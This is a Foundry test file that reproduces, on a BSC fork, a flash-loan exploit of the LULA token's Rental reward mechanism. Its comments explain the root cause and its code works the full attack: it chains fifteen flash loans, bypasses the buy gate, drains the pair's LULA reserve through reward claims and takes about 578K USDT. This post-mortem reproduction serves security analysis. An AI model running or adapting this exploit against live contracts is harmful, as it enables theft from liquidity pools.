// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// LULA - Rental reward claims call LULA.recycle(), which pulls LULA straight out of the PancakeSwap pair and
// sync()s, so the pair's LULA reserve can be drained without any USDT leaving it - BSC, 2026-07-28.
//
// Run: forge test --contracts src/test/2026-07/LULA_exp.sol --evm-version cancun -vvv
//   (Pancake Infinity Vault and Uniswap v4 use EIP-1153 transient storage; the repo default is shanghai.)
//
// Profit: 578,295.907588061000526778 USDT net to the attacker EOA, reproduced here to the wei.
//         197,050,771.007708796610064795 USDT pushed into the pair, 197,642,080.528989494738422649 USDT taken
//         back out, the difference minus flash-loan fees kept.
//
// On-chain references (BSC):
//   attack tx         : 0xa219ab9d57e520e5235b15a8801f4ebac8cc45551be0430ce4e49caea0411d7c
//   block             : 112655390 (the PoC forks at the attack tx so earlier txs in the block are replayed)
//   attacker EOA      : 0x2677806d48325Ced7533C54B86eD5e99b129a4ED (EIP-7702 delegated)
//   attacker contract : 0x5E506Ba06Fa6C61D1069B0E68d7013DE35AFA816
//   LULA team message : 0x392fc1d6cb1b3c832983c7eabb94a96b895c2f1c16c472a15930d4d7c4efc52d (on-chain bounty offer)
//
// Actors / contracts:
//   LULA token (verified, Sourcify)   : 0xF5d7029eb6751d170dcF0Bb1c87Af6f93d5A2e9a
//   LULA/USDT PancakeSwap V2 pair     : 0xF0b36389a12A28be1280c0ec2A4bbc76889D6a96 (token0 = USDT, token1 = LULA)
//   Rental (unverified)               : 0x377a015f44C3FDf71060e94648EDC9e0316C7f1a
//   LULA owner (fee-excluded EOA)     : 0x43721aBC1D19378C6160AbfdA6f1dd488EBBB5c9
//   Attacker reward helpers (5)       : 0x2a6cF859..., 0xF60F0895..., 0xFE2554A2..., 0xfD7eaBd4..., 0x6222155a...
//
// ROOT CAUSE:
//   LULA.recycle(amount) can only be called by the Rental contract. It moves up to one third of the pair's LULA
//   balance from the pair to Rental with a raw _basicTransfer (no swap, nothing paid back) and then calls
//   pair.sync(), so the pair's LULA reserve shrinks while its USDT reserve is untouched:
//
//       function recycle(uint256 amount) external {
//           require(msg.sender == rentalContract, "Only Rental");
//           uint256 maxTake = balanceOf[uniswapV2Pair] / 3;
//           uint256 actual = amount >= maxTake ? maxTake : amount;
//           _basicTransfer(uniswapV2Pair, rentalContract, actual);
//           IUniswapV2Pair(uniswapV2Pair).sync();
//       }
//
//   Rental funds team and referral reward payouts by calling recycle() in a loop (up to 10 rounds, inferred from
//   the trace: the attacker's two Rental top-ups equal pending - pairLULA * (1 - (2/3)^10) to the wei, and a claim
//   that cannot be covered reverts with "LP liquidity insufficient"). Every reward claim therefore drains LULA out
//   of the pool for free. Anyone who holds reward positions decides when those drains happen.
//
//   A second flaw makes the price push possible at all: buys are disabled (buyEnabled == false), but _transfer()
//   skips that check whenever the sender or recipient is fee-excluded. Routing a pair swap's output to the
//   fee-excluded LULA owner address bypasses the buy gate.
//
// THE ATTACK (one atomic tx; every amount below is taken verbatim from the trace):
//   0. Setup, about 12 days earlier: helper contracts accrue team and referral rewards in Rental (state at fork).
//   1. Borrow ~197.05M USDT from 15 sources: Moolah (USDT and WBNB), Aave V3 and Venus (WBNB collateral, USDT
//      borrow), Pancake Infinity Vault, Uniswap v4 PoolManager and ten PancakeSwap/Uniswap V3 pools.
//   2. Sell 5,000 LULA, then swap all the USDT for LULA with the output sent to the fee-excluded LULA owner.
//      The pair goes from 591,841 USDT / 8,001,957 LULA to 197,642,262 USDT / 24,022 LULA.
//   3. Claim team and referral rewards through the helpers. Each claim makes Rental recycle() LULA out of the
//      pair; the pair's LULA reserve falls from 24,022 to 0.0044 while its USDT reserve stays at 197.64M.
//   4. Sell 4,999 LULA back into the pair for 197,642,080 USDT, repay every loan, keep the difference.

interface IERC20 {
    function balanceOf(
        address
    ) external view returns (uint256);
    function approve(
        address,
        uint256
    ) external returns (bool);
    function transfer(
        address,
        uint256
    ) external returns (bool);
}

interface IWBNB is IERC20 {
    function deposit() external payable;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPair {
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IRental {
    function claimTeamReward() external;
    function claimReferralReward() external;
    function pendingReferralReward(
        address user
    ) external view returns (uint256);
}

interface IMoolah {
    function flashLoan(
        address token,
        uint256 assets,
        bytes calldata data
    ) external;
}

interface IAaveV3Pool {
    function supply(
        address asset,
        uint256 amount,
        address onBehalfOf,
        uint16 referralCode
    ) external;
    function borrow(
        address asset,
        uint256 amount,
        uint256 rateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;
    function repay(
        address asset,
        uint256 amount,
        uint256 rateMode,
        address onBehalfOf
    ) external returns (uint256);
    function withdraw(
        address asset,
        uint256 amount,
        address to
    ) external returns (uint256);
}

interface IVToken {
    function mint(
        uint256 mintAmount
    ) external returns (uint256);
    function borrow(
        uint256 borrowAmount
    ) external returns (uint256);
    function repayBorrow(
        uint256 repayAmount
    ) external returns (uint256);
    function redeemUnderlying(
        uint256 redeemAmount
    ) external returns (uint256);
}

interface IComptroller {
    function enterMarkets(
        address[] calldata vTokens
    ) external returns (uint256[] memory);
    function exitMarket(
        address vToken
    ) external returns (uint256);
}

// Pancake Infinity Vault and Uniswap v4 PoolManager share the take / sync / settle accounting.
interface IFlashAccounting {
    function take(
        address currency,
        address to,
        uint256 amount
    ) external;
    function sync(
        address currency
    ) external;
    function settle() external payable returns (uint256);
}

interface IInfinityVault is IFlashAccounting {
    function lock(
        bytes calldata data
    ) external returns (bytes memory);
}

interface IPoolManager is IFlashAccounting {
    function unlock(
        bytes calldata data
    ) external returns (bytes memory);
}

interface IV3Pool {
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

contract LULA_exp is Test {
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant LULA = IERC20(0xF5d7029eb6751d170dcF0Bb1c87Af6f93d5A2e9a);
    IPair constant PAIR = IPair(0xF0b36389a12A28be1280c0ec2A4bbc76889D6a96);
    IRental constant RENTAL = IRental(0x377a015f44C3FDf71060e94648EDC9e0316C7f1a);
    IRouter constant ROUTER = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant LULA_OWNER = 0x43721aBC1D19378C6160AbfdA6f1dd488EBBB5c9;
    address constant ATTACKER_EOA = 0x2677806d48325Ced7533C54B86eD5e99b129a4ED;

    IMoolah constant MOOLAH = IMoolah(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);
    IAaveV3Pool constant AAVE = IAaveV3Pool(0x6807dc923806fE8Fd134338EABCA509979a7e0cB);
    IComptroller constant VENUS = IComptroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IVToken constant vWBNB = IVToken(0x6bCa74586218dB34cdB402295796b79663d816e9);
    IVToken constant vUSDT = IVToken(0xfD5840Cd36d94D7229439859C0112a4185BC0255);
    IInfinityVault constant INFINITY_VAULT = IInfinityVault(0x238a358808379702088667322f80aC48bAd5e6c4);
    IPoolManager constant V4_POOL_MANAGER = IPoolManager(0x28e2Ea090877bF75740558f6BFB36A5ffeE9e9dF);

    // Reward helpers deployed by the attacker beforehand: [team + referral] x 4, [referral] x 1.
    address[5] HELPERS = [
        0x2a6Cf8592D1CC22BEd916481bb745ccAf80aE6F1,
        0xF60F0895301fdEF5f4795A8A6b57f5cb2A664E3c,
        0xFE2554A23b352dEC8A93aFD2DD463A453d8eE0CE,
        0xfD7eaBd41D826ADBA28Ef982BcC75AB1C679E4FA,
        0x6222155a9010Ec62dDe38e8E1606c7Bcd4Ce5897
    ];

    // Exact amounts from the attack trace.
    uint256 constant MOOLAH_USDT = 4_403_307_398_128_352_291_053_180;
    uint256 constant MOOLAH_WBNB = 407_751_430_795_609_694_003_729;
    uint256 constant AAVE_SUPPLY_WBNB = 40_000 ether;
    uint256 constant AAVE_DUST = 1e10;
    uint256 constant AAVE_BORROW_USDT = 14_636_621_772_420_346_946_050_423;
    uint256 constant VENUS_MINT_WBNB = 367_751_430_795_609_694_003_729;
    uint256 constant VENUS_BORROW_USDT = 64_955_663_379_338_748_619_443_095;
    uint256 constant INFINITY_TAKE = 32_147_231_984_738_329_901_152_482;
    uint256 constant V4_TAKE = 7_269_161_757_736_031_096_864_779;

    struct V3Loan {
        address pool;
        uint256 amount0;
        uint256 amount1;
    }

    V3Loan[] v3Loans;
    uint256 v3Index;

    function setUp() public {
        // Fork at the attack tx: the preceding txs of block 112655390 move the V3 pool balances the attacker drained.
        vm.createSelectFork("bsc", bytes32(0xa219ab9d57e520e5235b15a8801f4ebac8cc45551be0430ce4e49caea0411d7c));

        // USDT is token0 in every pool except 0xE1Acb466 (token1).
        v3Loans.push(V3Loan(0x92b7807bF19b7DDdf89b706143896d05228f3121, 29_236_768_547_355_438_981_519_624, 0));
        v3Loans.push(V3Loan(0xA0909f81785f87f3e79309F0E73A7d82208094E4, 11_643_668_127_563_301_627_726_297, 0));
        v3Loans.push(V3Loan(0xB67e5EaF770a384Ab28029d08B9bC5EBE32beb0F, 5_814_197_856_428_562_881_489_358, 0));
        v3Loans.push(V3Loan(0x172fcD41E0913e95784454622d1c3724f546f849, 4_923_756_995_994_218_957_904_214, 0));
        v3Loans.push(V3Loan(0x1c3865814aCbBa11E7196dF0b46c024472503196, 4_351_691_767_292_172_303_794_984, 0));
        v3Loans.push(V3Loan(0x9c4Ee895e4f6Ce07Ada631C508D1306Db7502cCE, 2_573_116_393_016_957_804_154_331, 0));
        v3Loans.push(V3Loan(0xcF59B8C8BAA2dea520e3D549F97d4e49aDE17057, 60_809_771_405_589_276_349_392, 0));
        v3Loans.push(V3Loan(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb, 15_000_000 ether, 0));
        v3Loans.push(V3Loan(0xE1aCb466421eD24Dd8bd381D1205baD0ad43Ca9c, 0, 476_328_831_893_296_064_707));
        v3Loans.push(V3Loan(0x81C7294b66955824BC04acB642ae8dC58e6cE507, 33_948_697_702_930_647_751_326, 0));

        vm.label(address(LULA), "LULA");
        vm.label(address(PAIR), "LULA/USDT Pair");
        vm.label(address(RENTAL), "Rental");
        vm.label(LULA_OWNER, "LULA owner (fee-excluded)");

        // The default test address already holds some USDT on BSC; start from zero so the figures match the trace.
        deal(address(USDT), address(this), 0);
    }

    function testExploit() public {
        // The attacker's own 5,000 LULA (the attack contract pulled them from the EOA with transferFrom).
        vm.prank(ATTACKER_EOA);
        LULA.transfer(address(this), 5000 ether);

        // 1e10 wei of WBNB covers the dust Aave keeps when the WBNB collateral is withdrawn (see below).
        WBNB.deposit{value: AAVE_DUST}();

        USDT.approve(address(MOOLAH), type(uint256).max);
        WBNB.approve(address(MOOLAH), type(uint256).max);
        MOOLAH.flashLoan(address(USDT), MOOLAH_USDT, abi.encode(false));

        uint256 profit = USDT.balanceOf(address(this));
        emit log_named_decimal_uint("Attacker USDT profit", profit, 18);
        assertEq(profit, 578_295_907_588_061_000_526_778, "net profit matches the on-chain attack");
    }

    // ---- funding chain ----

    function onMoolahFlashLoan(
        uint256,
        bytes calldata data
    ) external {
        require(msg.sender == address(MOOLAH));
        if (!abi.decode(data, (bool))) {
            MOOLAH.flashLoan(address(WBNB), MOOLAH_WBNB, abi.encode(true));
            return;
        }

        WBNB.approve(address(AAVE), type(uint256).max);
        AAVE.supply(address(WBNB), AAVE_SUPPLY_WBNB, address(this), 0);
        AAVE.borrow(address(USDT), AAVE_BORROW_USDT, 2, 0, address(this));

        WBNB.approve(address(vWBNB), type(uint256).max);
        require(vWBNB.mint(VENUS_MINT_WBNB) == 0, "venus mint");
        address[] memory markets = new address[](1);
        markets[0] = address(vWBNB);
        VENUS.enterMarkets(markets);
        require(vUSDT.borrow(VENUS_BORROW_USDT) == 0, "venus borrow");

        INFINITY_VAULT.lock("");

        USDT.approve(address(vUSDT), VENUS_BORROW_USDT);
        require(vUSDT.repayBorrow(VENUS_BORROW_USDT) == 0, "venus repay");
        VENUS.exitMarket(address(vWBNB));
        require(vWBNB.redeemUnderlying(VENUS_MINT_WBNB) == 0, "venus redeem");

        USDT.approve(address(AAVE), AAVE_BORROW_USDT);
        AAVE.repay(address(USDT), AAVE_BORROW_USDT, 2, address(this));
        // Repaying the exact borrow leaves rounding dust in the debt, so withdrawing every last wei of collateral
        // would fail the health-factor check. The attacker left 1e10 wei behind, as here.
        AAVE.withdraw(address(WBNB), AAVE_SUPPLY_WBNB - AAVE_DUST, address(this));
    }

    function lockAcquired(
        bytes calldata
    ) external returns (bytes memory) {
        require(msg.sender == address(INFINITY_VAULT));
        INFINITY_VAULT.take(address(USDT), address(this), INFINITY_TAKE);
        V4_POOL_MANAGER.unlock("");
        _settle(INFINITY_VAULT, INFINITY_TAKE);
        return "";
    }

    function unlockCallback(
        bytes calldata
    ) external returns (bytes memory) {
        require(msg.sender == address(V4_POOL_MANAGER));
        V4_POOL_MANAGER.take(address(USDT), address(this), V4_TAKE);
        _nextV3Loan();
        _settle(V4_POOL_MANAGER, V4_TAKE);
        return "";
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata
    ) external {
        _onV3Flash(fee0, fee1);
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata
    ) external {
        _onV3Flash(fee0, fee1);
    }

    function _nextV3Loan() internal {
        if (v3Index == v3Loans.length) {
            _attack();
            return;
        }
        V3Loan memory loan = v3Loans[v3Index++];
        IV3Pool(loan.pool).flash(address(this), loan.amount0, loan.amount1, "");
    }

    function _onV3Flash(
        uint256 fee0,
        uint256 fee1
    ) internal {
        V3Loan memory loan = v3Loans[v3Index - 1];
        require(msg.sender == loan.pool);
        _nextV3Loan();
        USDT.transfer(loan.pool, loan.amount0 + fee0 + loan.amount1 + fee1);
    }

    function _settle(
        IFlashAccounting vault,
        uint256 amount
    ) internal {
        vault.sync(address(USDT));
        USDT.transfer(address(vault), amount);
        vault.settle();
    }

    // ---- the exploit ----

    function _attack() internal {
        address[] memory sell = new address[](2);
        sell[0] = address(LULA);
        sell[1] = address(USDT);
        address[] memory buy = new address[](2);
        buy[0] = address(USDT);
        buy[1] = address(LULA);
        LULA.approve(address(ROUTER), type(uint256).max);
        USDT.approve(address(ROUTER), type(uint256).max);

        _logReserves("Pair before");

        // Step 2: sell 5,000 LULA, then push all the USDT into the pair. buyEnabled is false, but sending the
        // output to the fee-excluded owner takes the _basicTransfer path and skips the buy gate.
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            5000 ether, 0, sell, address(this), block.timestamp
        );
        uint256 usdtIn = USDT.balanceOf(address(this));
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(usdtIn, 0, buy, LULA_OWNER, block.timestamp);
        _logReserves("Pair after USDT push");

        // Step 3: every reward claim makes Rental recycle() LULA out of the pair and sync() it.
        for (uint256 i; i < 4; i++) {
            vm.startPrank(HELPERS[i]);
            RENTAL.claimTeamReward();
            LULA.transfer(address(this), LULA.balanceOf(HELPERS[i]));
            vm.stopPrank();
        }
        for (uint256 i; i < 5; i++) {
            _topUpRentalIfNeeded(RENTAL.pendingReferralReward(HELPERS[i]));
            vm.startPrank(HELPERS[i]);
            RENTAL.claimReferralReward();
            LULA.transfer(address(this), LULA.balanceOf(HELPERS[i]));
            vm.stopPrank();
        }
        _logReserves("Pair after reward claims");

        // Step 4: 4,999 LULA now buys back almost all of the pair's USDT.
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            4999 ether, 0, sell, address(this), block.timestamp
        );
        emit log_named_decimal_uint("USDT pushed into the pair", usdtIn, 18);
        emit log_named_decimal_uint("USDT taken back out", USDT.balanceOf(address(this)), 18);
    }

    // Once the pair is nearly empty, Rental's bounded recycle loop cannot cover a claim on its own. The attacker
    // sent the shortfall to Rental first; this formula reproduces both of their top-ups to the wei.
    function _topUpRentalIfNeeded(
        uint256 pending
    ) internal {
        uint256 pairLula = LULA.balanceOf(address(PAIR));
        uint256 left = pairLula;
        for (uint256 k; k < 10; k++) {
            left -= left / 3;
        }
        uint256 available = LULA.balanceOf(address(RENTAL)) + (pairLula - left);
        if (pending > available) LULA.transfer(address(RENTAL), pending - available);
    }

    function _logReserves(
        string memory label
    ) internal {
        (uint112 usdtReserve, uint112 lulaReserve,) = PAIR.getReserves();
        emit log_string(label);
        emit log_named_decimal_uint("  USDT reserve", usdtReserve, 18);
        emit log_named_decimal_uint("  LULA reserve", lulaReserve, 18);
    }
}
